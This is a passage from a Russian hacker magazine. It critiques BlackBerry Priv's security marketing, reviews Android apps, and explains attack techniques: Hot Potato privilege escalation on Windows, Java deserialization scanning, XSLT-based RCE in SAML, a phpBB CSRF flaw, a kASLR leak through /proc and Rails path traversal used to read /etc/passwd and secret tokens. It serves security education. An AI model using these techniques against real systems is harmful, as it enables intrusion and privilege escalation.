реализована в рамках проекта PaX (патч для ядра Linux) в 2001 году. Суть тех-
нологии проста и сводится к тому, чтобы вместо размещения кода приложения,
его стека, хипа и библиотек-зависимостей последовательно в оперативной
памяти (при загрузке приложения) рандомно раскидать их по разным участ-
кам. ASLR сильно затрудняет работу взломщика (а точнее, написание экспло-
итов), так как, вызвав переполнение, он не будет точно знать, на какой адрес
«прыгнуть», чтобы выполнить шелл-код или, например, вызвать нужную функ-
цию libc (ее адрес в памяти может быть буквально любым).
   Сегодня ASLR в том или ином виде поддерживается практически всеми по-
пулярными ОС, и Android вовсе не исключение: полная поддержка этой техно-
логии появилась в версии 4.1, а в урезанном виде (только для стека) была до-
ступна аж с первых версий системы. Проблема только в том, что из-за самого
принципа работы Android, который предполагает использовать одну и ту же
загруженную в память среду исполнения для запуска всех приложений (форк
процесса zygote в режиме copy-on-write), ASLR здесь не так эффективна, как
в других системах (адреса всех библиотек и классов среды исполнения оста-
ются одинаковыми для всех приложений).
   Практически единственный способ решить эту проблему — повторно за-
гружать среду исполнения для каждого приложения отдельно. Именно так,
кстати говоря, поступили создатели прошивки CopperheadOS, что привело
к дополнительному расходу памяти (от 3 до 15 Мбайт на каждое приложение).
Сделали ли так же создатели BlackBerry Priv? Конечно, нет, поэтому говорить
о каких-либо улучшениях они просто не имеют права.

УЛУЧШЕНИЕ ПОЛИТИК SELINUX
SELinux (Security Enhanched Linux) — это один из так называемых security-мо-
дулей ядра, добавляющий в него реализацию модели мандатного контроля
доступа. Две его основные функции — это тонкая настройка прав доступа
к файлам и ограничение приложений в полномочиях (а точнее, в возможности
выполнять системные вызовы ядра). Проще говоря, SELinux позволяет точно
указать, что может делать приложение (например, создавать сетевые подклю-
чения) и к каким файлам оно может получить доступ.
  В Android SELinux появился в версии 4.2 и в первую очередь используется
для урезания прав низкоуровневых сервисов, написанных на языке C или C++
(если в одном из них будет найден баг, взломщику будет гораздо труднее ис-
пользовать его для получения доступа к системе). На более высоком уровне
(там, где работают простые приложения и большая часть системы) в Android
и раньше существовали свои довольно надежные механизмы защиты: песоч-
ницы для приложений, права доступа (своя отдельная реализация) и контроли-
руемая ядром система обмена сообщениями. С помощью SELinux к ней лишь
добавили дополнительный слой защиты.
   Однако важно не это, а то, что модификацию политик SELinux выполняют
и многие другие вендоры и разработчики прошивок. Вопрос только в том, что
именно они модифицируют и что конкретно там нужно улучшать. В основном
они занимаются созданием политик для своих собственных сервисов и при-
ложений, что имеет мало общего с укреплением общей безопасности систе-
мы (по факту она была бы безопаснее, если бы этих сервисов и приложений не
было вообще). Что улучшила BlackBerry? Опять же непонятно.

УТИЛИТА PATHTRUST
Pathtrust — это утилита из операционной системы QNX 6.6, на которой ранее
базировались все смартфоны BlackBerry. Сама по себе она не очень интерес-
на, но является частью технологии так называемых доверенных файловых си-
стем. Последняя представляет собой просто защиту от запуска приложений
с определенных разделов диска или каталогов. В общем-то, штука довольно
полезная, но есть одно но — в Android все это уже есть из коробки.
   Например, обычное приложение имеет право запускать какие бы то ни было
файлы только из своей песочницы или одного из каталогов, содержащих стан-
дартный набор UNIX-команд (/system/bin и другие), а запуск файлов с карты
памяти запрещен в принципе (все это контролируется с помощью не только
обычных прав доступа, но и политик SELinux). Более того, в данном случае, го-
воря о запуске, я имею в виду именно нативные приложения, работающие по-
верх ядра Linux, запуск Android-приложений полностью контролируется систе-
мой, и можно запустить только те, что явно установлены. То есть нельзя просто
куда-то кинуть пакет APK с вирусом и запустить его из другого приложения (по
крайней мере до тех пор, пока смартфон не рутован).

ПРИЛОЖЕНИЕ DTEK
DTEK — фирменное приложение от BlackBerry, представляющее собой нечто
вроде центра безопасности. По сути, это симбиоз двух инструментов: ана-
лизатора текущего состояния смартфона, подсказывающего пути повышения
его безопасности, и менеджера полномочий приложений, который позволяет
узнать, какие приложения используют определенные функции ОС, и уведом-
ляет об этом юзера.
   Работу обеих функций в деле можно оценить по скриншотам ниже. Нетруд-
но заметить, что тот самый «анализатор безопасности» — это не что иное, как
просто система для проверки тех или иных настроек: включена отладка по
USB — плохо, включена установка приложений из сторонних источников —
плохо, нет ПИН-кода — плохо и так далее. Обрати особое внимание, что отсут-
ствие логина в аккаунт Google — это тоже плохо: BlackBerry Priv полностью по-
лагается на гугловские функции сброса до заводских настроек и поиска
смартфона, но на то, что данные будут утекать в Google, можно, по их мнению,
и забить. В целом довольно бесполезная штуковина, не учитывающая реаль-
ные потребности юзера и рассчитанная на неискушенного пользователя.
  «Менеджер полномочий» (это я его так называю) — гораздо более инте-
ресная штука. Он позволяет точно определить, какие функции ОС (камера,





«Анализ» безопасности с помощью DTEK     Менеджер полномочий
местоположение и прочее) и когда использовали установленные приложения,
а самое главное — уведомляет юзера об этом в режиме реального времени.
Удобно? Безусловно. Если не брать в расчет тот факт, что эта функция времен-
но появилась в Android 4.3 и является стандартной начиная с CyanogenMod
10.1 (откуда, я уверен, ее сперла BlackBerry). Причем реализация данной функ-
ции в CyanogenMod позволяет также и отзывать полномочия, что в BlackBerry
сделать нельзя по простой причине: приложение может работать некорректно
или падать.
   Кстати, штатная функция корректного отзыва полномочий и их запроса пря-
мо во время работы приложений появилась в Android 6.0, однако работает она
только в отношении новых приложений, собранных специально для нее (Target
SDK: 23).

КРИПТОБИБЛИОТЕКА, СЕРТИФИЦИРОВАННАЯ
ПО СТАНДАРТУ FIPS 140-2
FIPS 140-2 — это стандарт США, используемый для сертификации криптогра-
фических модулей (как железных, так и программных). Его назначение в том,
чтобы не пропустить в госучреждения и компании, работающие с важной ин-
формацией (финансовый и медицинский сектор), потенциально небезопасный
софт, реализующий уязвимые методы защиты данных (или не реализующий их
вовсе). В рамках программы CMVP (Cryptographic Module Validation Program)
любая компания может получить сертификат соответствия FIPS 140-2, отдав
свой софт на экспертизу.
  С одной стороны, все отлично, серьезная организация дала свое добро
на использование криптоалгоритмов BlackBerry Priv для хранения и обработ-
ки критически важных данных. С другой стороны, пройти проверку на соот-
ветствие 140-2 может практически любая испытанная временем реализация
считающегося надежным криптоалгоритма. То есть в буквальном смысле
ее пройдет и реализация алгоритмов шифрования ядра Linux, и OpenSSH,
и OpenSSL. Поэтому в случае с BlackBerry Priv соответствие FIPS 140-2 не
значит ровным счетом ничего и используется просто как маркетинг, а на
деле это, скорее всего, все тот же алгоритм шифрования AES, используемый
в Android.
  И да, не стоит забывать, что в последний раз стандарт FIPS 140-2 обнов-
лялся в 2002 году.

ВЫВОДЫ
Как видишь, если даже BlackBerry, компания, дорожащая своим имиджем сре-
ди Enterprise-клиентов, сильно преувеличивает значимость своей ОС и своих
технологий, то что говорить обо всех остальных. Так, создатели GATCA: Elite,
смартфона, приведенного как пример в начале статьи, вообще нарушают
все границы наглости в своем вранье и заявляют о технологиях, которые
есть даже в голом Android (256-битный ключ шифрования, необходимость
мигнуть при снимке лица, блокировка при выходе из географической зоны)
или легко реализуются с помощью одного из десятков антиворов (блокировка
в случае смены SIM-карты). Так что будь внимателен и не ведись на маркетин-
говые разводки.
MOBILE



ВЫПУСК #16. ПРОДУКТИВНОСТЬ
КАРМАННЫЙ                 В этом выпуске: быстро
                     находим определения
                     и перевод выделенных
                        слов, ищем самый простой
                     способ переключенияСОФТ
                    между запущенными
                     приложениями, создаем
                      список дел, о котором
                      ты точно не забудешь,
                     и добавляем поддержку
                     макросов во все поля
                       ввода. Приятного чтения.
                   Text Aide
             Платформа: Android 4.0+
              Цена: бесплатно

TEXT AIDE
Сколько раз, читая техническую литературу
или статьи на иностранном языке, тебе прихо-
дилось копировать непонятные слова, а затем
открывать браузер и искать их в Википедии или
словарях? Думаю, с этим сталкивались все,
и это действительно раздражает. Text Aide по-
зволяет решить эту проблему сразу несколь-
кими путями, из которых ты можешь выбрать
наиболее подходящий конкретно тебе.
   Первый: ты можешь просто выделить слово
и нажать «Копировать», после этого на экране
появится окно с определением слова из Ви-
кипедии, викисловаря или словаря англий-
ских слов. Второй: ты можешь использовать
кнопку «Поделиться», а затем выбрать в спи-
ске Define. Третье: виджет рабочего стола.
Все это тем или иным образом настраивает-
ся или отключается, например можно выбрать
язык для поиска в Википедии или отключить
возможность «поделиться» текстом.
  Но это еще не все. У Text Aide есть не-
сколько дополнительных функций, включая
произношение текста (пункт Speak после
выделения) и макросы. Последние позво-
ляют быстро вводить длинные предложения
одним словом. Все, что нужно сделать, —
это нажать Expand на главном экране и до-
бавить любое количество макросов. Затем
в любом приложении ты просто печатаешь
имя макроса, начиная его с символа @, и Text
Aide разворачивает его в полное предложе-
ние. Плюс в маркете есть приложение Dict
Aide, добавляющее в Text Aide поддержку
поиска по словарям.
                  Pintasking
             Платформа: Android 4.1+
              Цена: бесплатно / 217 р.

PINTASKING
Проблему одновременной работы со мно-
жеством приложений пытались решить
многие разработчики, и, наверное, разра-
ботчик приложения Pintasking подошел к ее
решению наиболее близко. Pintasking ра-
ботает следующим образом: когда ты от-
крываешь приложение, к которому хочешь
вернуться в ближайшем времени, ты вытя-
гиваешь шторку и нажимаешь на уведомле-
ние с именем Tap to pin, в результате прило-
жение сворачивается, а справа (или слевв,
как настроишь) появляется небольшой пу-
зырь с иконкой. Свернув таким образом не-
сколько приложений, ты можешь переклю-
чаться между ними, тапая по пузырям.
   У Pintasking масса настроек, в том чис-
ле возможность быстро переключаться
между приложениями, удерживая кноп-
ку «Домой», быстрый pin приложений без
необходимости открывать шторку, однако
все они доступны только в платной версии.
Вообще, бесплатная версия Pintasking на-
столько сильно урезана, что в ней недо-
ступны практически все настройки, а ко-
личество пузырей ограничивается всего
двумя. Это главный и фактически един-
ственный недостаток приложения.
                Focus Notify
             Платформа: Android 4.2+
              Цена: бесплатно

FOCUS NOTIFY
В маркете можно найти огромное количе-
ство приложений для ведения TODO-спи-
сков, начиная от Google Keep и Evernote
и  заканчивая  простенькими  блокнота-
ми. Focus Notify отличается от них. С од-
ной стороны, это довольно стандартный
TODO-список с хорошим продуманным
интерфейсом в стиле Material. С другой —
приложение заставит тебя никогда не за-
бывать о делах, так как размещает каждую
запись списка в форме уведомления. По-
этому они всегда будут у тебя на виду, но
не будут занимать место в строке состоя-
ния и высвечиваться на рабочем столе.
   Приложение простое, без излишней
функциональности, с минимальным коли-
чеством настроек и при этом абсолютно
бесплатное.
                 Textpand
             Платформа: Android 5.0
              Цена: бесплатно

TEXTPAND
Фактически это приложение повторяет
функцию макросов в Text Aide, то есть по-
зволяет создать псевдонимы для длинных
приложений и прочего в форме коротких
слов, которые будут автоматически раз-
вернуты при вводе текста. Однако в дан-
ном случае эта функциональность гораздо
более удобна и пользоваться приложени-
ем с одной понятной функцией проще, чем
целым комбайном.
  В общем-то, пояснять тут больше не-
чего, скажу лишь, что приложение умеет
делать автодополнения, так что, только
начав вводить текст, ты уже получить под-
сказку, какие макросы с ним совпадают.
Плюс высокая скорость работы, приятный
интерфейс и возможность делать бэкап
в Google Drive. Лично в моем списке при-
ложений Textpand занимает одно из пер-
вых мест, я рекомендую его всем. Серьез-
но упрощает жизнь.
Взлом





Алексей «GreenDog» Тюрин, Digital Security
agrrrdog@gmail.com,,twitter.com/antyurin
EASY





           WARNINGHACK
                    Вся информация предоставлена исключительно в ознакомительных целях.
                     Лица, использующие данную информацию в противозаконных целях, могут
                     быть привлечены к ответственности.
ПОВЫШАЕМ ПРИВИЛЕГИИ В WINDOWS
С ПОМОЩЬЮ HOT POTATO
Не так давно появилась «новая» атака, позволяющая повысить привилегии
в Windows с обычного пользователя до SYSTEM. Причем работает она прак-
тически «из коробки» под всеми современными версиями Windows, впрочем,
должна и под древними. Ее название — Hot Potato.
   Интересно, что сама атака состоит из нескольких отдельных техник, и ка-
ждая из них уже всплывала у нас в Easy Hack. И так как ты наверняка читаешь
каждый выпуск и помнишь все, что прочитал, я не буду разбирать все шаги
подробно и опишу лишь общую последовательность.
  В основе данной атаки лежат результаты исследователя из Google. Как ты,
наверное, помнишь, Windows поддерживает автоматическую аутентифика-
цию, а также протокол NTLM (с помощью которого и аутентифицируется). То
есть если мы можем заставить какой-то процесс попытаться подключиться
по протоколу SMB, HTTP и так далее и используем аутентификацию NTLM, то
процесс отправит нам свои креды. Когда-то можно было отправить эти кре-
ды обратно по тому же протоколу — на этом и была основана первая вариа-
ция атаки SMBRelay. Но в Microsoft выпустили патч, и теперь разрешено делать
relay либо между разными хостами, либо между разными протоколами.
  По итогам исследования Google был представлен proof of concept, который
демонстрировал, как системный процесс можно заставить подключиться к ло-
кально поднятому серверу WebDAV с NTLM-аутентификацией, а потом он реле-
ил полученные креды на SMB того же хоста. В результате появлялась возмож-
ность выполнять команды от имени системного процесса.
   У PoC было две основные проблемы. Во-первых, работал он в основном
на клиентских тачках, так как требовал предустановленный компонент в ОС
— клиент WebDAV. Во-вторых, использовал возможность антивируса Microsoft
проверять удаленные файлы, а она доступна только в определенных версиях.
   Ребята из Foxglove Security исправили эти недостатки. Причем особо нар-
команским образом — как раз как мы любим.
   Как ты знаешь, в Windows есть автоматическое обнаружение прокси, кото-
рое включено по умолчанию. ОС систематически ищет в сети хост с именем
WPAD и если находит, то скачивает с него настройки для прокси-сервера. Эти
настройки ко всему прочему используются системными службами, в том чис-
ле и Windows Update.
   Второй важный момент заключается в том, что ОС также автоматически
пытается аутентифицироваться на прокси (если сервер этого требует). То есть
WPAD-прокси решает первую проблему PoC — нам не требуется WebDAV-кли-
ент в ОС, так как прокси и аутентификация на нем поддерживается из коробки
всеми версиями Windows. Теперь наша задача сводится к тому, чтобы «пред-
ставиться» хостом WPAD для нашей ОС. И для ее решения мы можем исполь-
зовать локальный NBNS spoofing.
   Опять-таки, NBNS spoofing — классическая атака. Windows сначала ищет
WPAD, запрашивая его у DNS-сервера, но, не найдя на DNS, переходит к дру-
гим протоколам для поиска хоста по имени, включая NBNS (NetBIOS Name
Service). Поэтому ОС систематически отправляет по UDP широковещатель-
ные запросы к NBNS. Но как нам на них ответить? Привилегий на сниф трафи-
ка у нас нет, а использовать сторонний хост мы не можем, так как в этом случае
нам придет «пустая» учетка системного процесса.
   Однако тут есть интересный момент. У запроса NBNS есть специальное
поле — TXID. Это что-то вроде идентификатора, который нужен для того, чтобы
соотносить запрос и ответ. Размер поля — 2 байта, то есть 65 536 значений.
Локально мы можем послать множество NBNS-ответов со всеми возможными
вариантами TXID. И так как сеть практически не задействуется (все происхо-
дит на lookback-интерфейсе), то мы можем это сделать очень быстро.
  В результате получается такая последовательность. Мы отправляем мно-
жество NBNS-ответов с WPAD-сервером (и прокси-сервером), который мы
поднимаем на каком-нибудь высоком порту — прав хватит. Таким образом, мы
подменяем системный прокси. И как только какому-то системному процессу
потребуется выйти в интернет, он отправится на наш прокси, где будет запро-
шена NTLM-аутентификация. Креды процесса мы релеим уже на SMB и полу-
чаем RCE от SYSTEM.
   У атаки Hot Potato еще остается небольшая проблема: как заставить систем-
ный процесс куда-то пойти? Авторы придумали целый ряд способов — выбор
зависит от версии ОС. Чаще всего для эксплуатации необходимо подождать
какое-то время (полчаса или несколько часов). Подробнее смотри в блоге ис-
следователей.
   Здесь я хотел бы отметить еще две интересные техники. Во-первых, в том
случае, если запись про WPAD есть на DNS-сервере, хост не будет использо-
вать NBNS для поиска WPAD. Но мы можем забиндить все UDP-порты в систе-
ме, тогда DNS-запрос просто не будет отправлен, так как ОС не сможет привя-
зать запрос ни к одному порту. Если DNS-запрос не отправлен, ОС использует
NBNS.
   Во-вторых, ресерчеры из Foxglove утверждают, что атака на перебор TXID
для NBNS-ответов работает и против удаленных хостов. Если хост подключен
напрямую к интернету или находится в другой сети, то мы можем удаленно слать
множество NBNS-ответов на него. И если удача нам улыбнется, то мы сможем
удаленно подменить запись WPAD или какую-то другую.
ИЩЕМ JAVA-СЕРИАЛИЗАЦИЮ
ПРИ ПОМОЩИ SUPERSERIAL
Стоило нам начать подробно разбирать Java-сериализацию в рубрике Easy
Hack, как этот вектор атаки стал настолько модным, что ломают с его помощью
все подряд. Я знаю как минимум с десяток продуктов, в которых была найдена
соответствующая уязвимость, и с пяток случаев нахождения таких уязвимо-
стей участниками разных bug bounty. А ведь то же самое могло начаться еще
примерно год назад!
   Надеюсь, к одному из следующих выпусков Easy Hack я смогу заново осоз-
нать эксплоит и объяснить его простыми славами, без дебрей Java. А посему
сегодня мы коснемся сугубо практической части: поговорим о том, как же вы-
искивать уязвимое ПО.
  На самом деле задачи обычно две. Во-первых, обнаружить дырку в ПО,
в которую мы можем слать сериализованный объект, чтобы он был десериа-
лизован. А во-вторых, понять, использует ли программа уязвимую версию би-
блиотеки.
   Вторая задача хоть и важна, но не особенно. Решается она чисто экспери-
ментально (нужно послать сериализованный запрос с пейлоадом) или путем
анализа либ (когда есть доступ к исходникам). Если нет уязвимой либы, то при-
ложение всегда можно задосить, но это уже нехорошо.
  Для решения задачи с поиском уязвимости позволь предложить тебе
специальный плагин для Burp Suite — SuperSerial. Он прост, но полезен. Он
пытается отыскать в запросах и ответах от сервера сериализованные объек-
ты, в том числе представленные как Base64.
  С таким инструментом ты не пропустишь момента, когда один из кучи сер-
висов системы отдаст тебе маленький сериализованный объект (реальный
случай из жизни). Один нюанс: у меня есть некоторые сомнения в том, что пла-
гин умеет выделять Java-объекты, когда они перемешаны с другими данными.
   У SuperSerial есть собрат SuperSerial-Active. Он расширяет возможности ак-
тивного сканера Burp, добавляя проверку на Java-сериализацию. Фактически
он тупо шлет сериализованный объект с пейлоадом (используется ysoserial)
на каждый URL. Пейлоад представляет собой простую команду для отстука
на наш веб-сервер. Типичный метод Out of band (OOB). Плагин отображает, по
какому из URL произошла обработка объекта и какой из запросов ее вызвал.
Топорно, конечно, но это может сработать. Обычно для таких целей лучше ис-
пользовать не внешний веб-сервер, а DNS-сервер, так как исходящие подклю-
чения часто заблокированы на файрволе, а вот DNS-туннель блокируют редко.
ПОЛУЧАЕМ RCE В SAML ЧЕРЕЗ XSLT
Мы уже рассматривали атаки с использованием XSLT, но все равно стоит на-
помнить, что это за технология. Она позволяет с помощью XSL-стиля поме-
нять структуру XML. Но для нас XSLT интересен тем, что позволяет напрямую
писать код в стилях XSL, и этот код будет выполняться в процессе преобразо-
вания. В классическом случае проблема такой атаки в том, что чаще всего мы
контролируем только сам XML-документ, но не XSL-стиль, по которому он будет
преобразован. Однако на самом деле это не всегда так.
   Есть ряд ситуаций, когда XSL-стиль может находиться прямо внутри самого
XML. Да-да, в документе указывается описание того, как его необходимо преоб-
разовать. Делается это за счет добавления в документ еще одного namespace:
xmlns:xsl=http://www.w3.org/1999/XSL/Transform.  Предостерегаю  тебя  от
того, чтобы пихать XSLT-вектор в каждый XML по аналогии c XXE. Поддержка
XSLT на принимающей стороне (в XML-парсере) не появляется просто так.
   Увидеть, есть ли в браузере поддержка XSL внутри документов XML, мы
можем при обработке файлов SVG, а также при использовании «глубоких»
XML-технологий — таких как XML Digital Signature.
  XML DSig используется для подписи XML-документов. Этот стандарт позво-
ляет указывать XSLT-преобразования для документа до того, как будет прове-
рена подпись. По идее, это было сделано для более гибкого взаимодействия.
Когда есть разница между тем, как подпись считается на принимающей и на
отправляющей стороне (разные кодировки, учет переносов и лишних пробе-
лов — проблем возникает много), с помощью XSL-стиля можно компенсиро-
вать эту разницу. Для описания преобразования используется элемент
Transform (в Transforms). Пример ты можешь увидеть на картинке.

                                                              Подпись XML-
                                                                документа
                                                                        c указанием
                                                              трансформации
Получается, что у нас есть технология, которая из коробки поддержива-
ет XSLT-трансформацию. Если видишь какой-то сервис, использующий XML
DSig, значит, можешь попробовать заслать на него что-нибудь хорошее. При
этом помни, что твой документ должен быть валидным и все элементы подпи-
си тоже должны присутствовать. Сама она может и не быть валидной, но она
нужна, чтобы пройти первичный парсинг на корректность документа. А далее
выполнятся наши действия из стиля, и только после этого произойдет провер-
ка подписи.
   Если вспомнить, где XML DSig используется постоянно, то на ум приходит
Security Assertion Markup Language (SAML). Это такой открытый стандарт на базе
XML, который используется для создания централизованной аутентификации и
авторизации. Сам по себе он непрост, так что подробно разбирать его не будем.
Важно, что он часто используется в крупных компаниях.
   Что мы имеем в итоге? Есть протокол аутентификации SAML, в котором
используется технология XML DSig, которая, в свою очередь, поддерживает
XSLT-трансформацию. Эта длинная цепочка дает нам возможность до аутен-
тификации получить RCE. Очень удобно! Конечно, в реальности все не всегда
так просто: если разработчики или админы в курсе проблемы, то кастомные
стили для XML DSig могут быть и отключены.
Взлом





                                                                              Борис Рютин,
                                                                                                                             Digital Security
                                                                                                                b.ryutin@tzor.ru
                                                                                      @dukebarman
     WARNING                                                                                                dukebarman.pro

       Вся информация
     предоставлена исклю-
       чительно в ознако-
       мительных целях.
    Ни редакция, ни автор
     не несут ответственно-
      сти за любой возмож-
    ный вред, причиненный
     материалами данной
             статьи.

ОБЗОР
ЭКСПЛОЙТОВ
АНАЛИЗ СВЕЖЕНЬКИХ УЯЗВИМОСТЕЙ
   Сегодня мы разберем CSRF-уязвимость в популярном форуме
phpBB, а также покажем пример поиска подобных ошибок в большом
    проекте. Далее разберем технологию обхода kASLR и изучим
 эксплоит, основанный на удаленном выполнении кода в Ruby on Rails.


CSRF-УЯЗВИМОСТЬ В PHPBB
 CVSSv2:      N/A
 Дата релиза: 25 января 2016 года
 Автор:        Lander Brandt
 CVE:         N/A

Уязвимость была найдена в администраторской панели управления фору-
ма в форме создания BBCode. Поскольку BBCode добавлен в белый список,
созданный для администраторов, атакующий может инжектить произвольный
HTML или JavaScript в посты на форуме.
  Для лучшего понимания автор рекомендует рассмотреть скрипт ./phpbb/
phpBB/posting.php, так как он вызывается, когда пользователи создают сооб-
щения или темы. Этот контроллер должен проверять права доступа и возмож-
ность создания записей, а также обрабатывать формы и, возможно, экрани-
ровать HTML. В самом начале файла мы можем увидеть нечто интересное.





Здесь определено большинство параметров, используемых в контрол-
лере. Часть из них берет свои значения из устаревшей функции request_
var(). Она представляет собой обертку метода \phpbb\request\request_
interface::variable(),  который  возвращает запрошенные  значения  из
некоторого ассоциативного массива. Массив этот является объединением
значений глобальных переменных $_GET и $_POST. Все эти значения также об-
работаны функцией trim() и приведены к нужному типу.
   Таким образом, если мы найдем форму, которая отправляет запросы POST,
то, возможно, там же сможем отправить и GET. А это верный путь к нахожде-
нию CSRF-уязвимости.
  Но для начала разберем, как работают CSRF-токены в phpBB. Поищем
строку с обработчиком одной из форм.




Из названия функции check_form_key() ясно, что она проверяет токен CSRF,
а если заглянуть внутрь, то обнаруживается, что делает она это простым срав-
нением. Ниже в файле есть вызов еще одной функции.




То есть и добавление, и проверка токена CSRF осуществляется вручную. А это
еще больше наталкивает на мысль о наличии уязвимости.
   Попробуем найти в исходниках вызовы функций add_form_key() и check_form_
key(). Наша задача — найти файлы, где есть add_form_key() и при этом нет
check_form_key(). На следующем скриншоте показаны результаты такого поиска.

                                                        Найденные вызовы
                                                         функций add_form_
                                                                  key() и check_form_
                                                                  key()
Большее количество вызовов check_form_key(), чем add_form_key(), не долж-
но тебя смущать, так как проверять токен можно сколько угодно раз. Мы же
ищем такие места, где токен добавляется, но не проверяется. Таких мест все-
го два: acp_bbcode.php и acp_extensions.php.
  Файл acp_extensions.php нам не слишком интересен, так как он всего лишь
предоставляет администраторам возможность видеть нестабильные версии
расширений phpBB при проверке обновлений. В ходе успешной эксплуатации
такой CSRF-уязвимости атакующий может сделать так, что администратор бу-
дет думать, будто его плагины устарели. Не слишком полезно.
  А вот второй файл (acp_bbcode.php) подходит как нельзя лучше, так как
принимает параметры через POST-запрос, а метод request_var() исполь-
зуется для получения всех значений из формы. В итоге, используя получен-
ный CSRF-токен, мы можем создавать произвольные команды BBCode через
GET-запрос.
   Хоть эта уязвимость и может привести к XSS, но это не совсем полезно для
атакующего. По умолчанию phpBB повторно аутентифицирует админов, кото-
рые заходят в панель управления, и дает им в этот момент другой ID для сессии.
SID по умолчанию должен присутствовать как в cookie, так и в строке запроса.
   Теоретически возможна тайминг-атака, так как идентификаторы сессии
проверяются оператором сравнения.




Однако это не особенно практично, потому что сессии привязаны к IP, версии
браузера и некоторой другой информации. Но главное — провести такую ата-
ку по сети непросто. Исключение — если на одной из страниц панели админа
есть уязвимость XSS, которая позволит получить SID из document.location.

EXPLOIT

                                                           Полученная XSS-
                                                              уязвимость через
                                                      CSRF в форуме
                                                        phpBB
Автор опубликовал отчет и видео, где показано, как использовать эту уязви-
мость.

TARGETS
phpBB < 3.1.7-PL1.

SOLUTION
Производитель выпустил исправление.
ЭКСПЛУАТИРУЕМ УТЕЧКУ ИНФОРМАЦИИ В ЯДРЕ LINUX,
ЧТОБЫ ОБОЙТИ KASLR

 CVSSv2:      N/A
 Дата релиза: 24 января 2016 года
 Автор:       Marco Grassi
 CVE:         N/A

Многие из читателей знают про механизм ASLR (Address Space Layout
Randomization) — рандомизацию адресного пространства. Менее известный
kASLR — это то же самое, но для ядра (k — kernel). Пока что kASLR не включен
по умолчанию в популярных дистрибутивах, но это не делает их менее безо-
пасными. И вот почему.
   Некоторое время назад исследователь Марко Грасси изучал каталог /proc
в Android, и его внимание привлекло поле WCHAN. Это канал ожидания (wait
channel), там содержится адрес события, которое ожидает конкретный про-
цесс. Увидеть его можно при запуске команды ps с опцией -l.
   Узнать значение wchan ты можешь из пространства пользователя, прочи-
тав /proc/pid_of_interest/stat. И это довольно странно. Что, если наш про-
цесс находится в пространстве ядра? Тогда мы получим адрес ядра? После
некоторых проверок автор получил положительный ответ.
Значение 18446744071579755915 — это, очевидно, место расположения кода
ядра, и в hex выглядит следующим образом:

>>> hex(18446744071579755915)
   ‘0xffffffff810de58bL’

В качестве тестовой ОС автор выбрал Ubuntu 14.04, но, так как kASLR там не
включен по умолчанию, для успешного воспроизведения следующего приме-
ра нужно будет его включить.

EXPLOIT
Тестовый скрипт очень прост и быстр. Как сказано ранее, в /proc/pid/stat ле-
жит код ожидания из пространства ядра, поэтому мы можем:
1. Зафиксировать это место ожидания.
2. Получить с помощью WCHAN значение ASLR.
3. Сравнить утекшее значение с известным «случайным» значением.
4. Вывести смещение.

Для первого пункта мы можем воспользоваться следующим трюком: если
форкнуть процесс и перевести его в режим сна, то после этого мы сможем
прочитать его /proc/sleeping-pid/stat, и, пока процесс спит, это будет ста-
бильным значением.
  Во втором пункте все ясно, а в третьем известное значение мы можем по-
лучить, к примеру, запустив ядро без включенного kASLR, но есть и другие
способы.
  Пример получения адресов на языке Python.
Вот как будет выглядеть результат работы.

marco@marco-l:~/Documents$ python infoleak.py
   Leaking kernel pointers...
   leak: 0xffffffffb70de58b 18446744072485725579
   kASLR slide: 0x36000000

Если хочешь узнать больше про kASLR, рекомендую вот этот топик с подбор-
кой ссылок по теме.

TARGETS
Системы с включенным kASLR и без указанного ниже патча.

SOLUTION
Производитель выпустил исправление.
УДАЛЕННОЕ ВЫПОЛНЕНИЕ КОДА
В RUBY ON RAILS

 CVSSv2:      N/A
 Дата релиза: 25 января 2016 года
 Автор:       John Poulin
 CVE:         CVE-2016-0752

Разберем уязвимость в фреймворке Ruby on Rails, которая в определенных
условиях позволяет атакующему выполнить удаленно произвольный код. Если
исследуемое приложение использует динамический рендеринг путей (к при-
меру, render params:id(), то оно уязвимо.
   Контроллеры RoR по умолчанию полностью рендерят отображаемый файл,
который соответствует вызываемым методам. К примеру, метод контроллера
show полностью сгенерирует файл show.html.erb, если не получит других точ-
ных параметров рендеринга.
   Однако во многих случаях разработчики решают, как рендерить, на основе
формата, то есть результат будет разным в зависимости от того, что должно
быть на выходе — HTML, JSON, XML или другой формат. В указанном выше
случае используется языковой шаблон (ERB, HAML и так далее). Есть несколь-
ко методов, которые можно использовать, чтобы повлиять на отображение со-
держимого. Для наших целей мы сфокусируемся на методе рендеринга. В до-
кументации Rails описано несколько способов вызывать такой метод, включая
возможность явно указать путь к содержимому с помощью опции file:.
   Рассмотрим небольшой код.





На первый взгляд он очень прост, и можно сразу предположить, что контроллер
хочет отобразить шаблон с помощью параметра template. Но неясно, откуда
он его будет подгружать. Из основной директории или откуда-то еще? Будет ли
это полный путь до файла или просто его имя? Разберемся с механизмом чуть
подробнее. Это яркий пример функции, которая пытается выполнить слишком
много всего. В ней-то и кроется проблема.
   Предположим, мы ждем,  что функция отрендерит файл app/views/
user/#{params[:template]}. Другими словами, если значение параметра ша-
блона будет равно dashboard, то будет выполнена попытка загрузить файл
app/views/user/dashboard.{ext}, где ext — это любое из разрешенных рас-
ширений: .html, .haml, .html.erb и так далее.
                                                       Пример загрузки
                                                        шаблона dashboard




Но что будет, если мы попытаемся загрузить шаблон из другого пути —
../admin/dashboard?

                                                         Попытка загрузки
                                                        шаблона из ../admin/
                                                               dashboard





После небольшого анализа ошибки стало понятно, что приложение пытается
найти шаблон по нескольким путям, включая RAILS_ROOT/app/views, RAILS_
ROOT и корневую директорию системы. Первым делом, конечно, хочется про-
верить доступность файла /etc/passwd, что и сделал автор эксплоита.

                                                          Читаем файл /etc/
                                                           passwd





Если мы можем читать файлы системы, то, может, получится узнать содержи-
мое исходников приложения и его настройки? Например, config/initializers/
secrettoken.rb.





Содержимое файла config/initializers/secrettoken.rb_ file
Сделать все это позволил код, который использовал динамический рендеринг
путей внутри приложения. И к сожалению, это не самое худшее.

EXPLOIT
Исследователь Джефф Джармок описал в своей статье «The Anatomy of a Rails
Vulnerability — CVE-2014-0130: From Directory Traversal to Shell» возможность
получения шелла в приложениях Rails, если будет найдена уязвимость обхода
путей. Он как раз описывает схожую ошибку, скрытую в механизме рендерин-
га. В нашем же случае была найдена уязвимость типа LFI, а она имеет другую
особенность. Мы загружаем, интерпретируем и выполняем файл как код (ERB).
Обычная уязвимость обхода путей возвращает неисполняемый контент (к при-
меру, файл CSV). Мы же не только можем прочитать исходники приложения и
другие доступные для чтения файлы в системе, но и выполнить Ruby-код с пра-
вами веб-сервера.
  Для проведения атаки воспользуемся техникой «загрязнения» логов, кото-
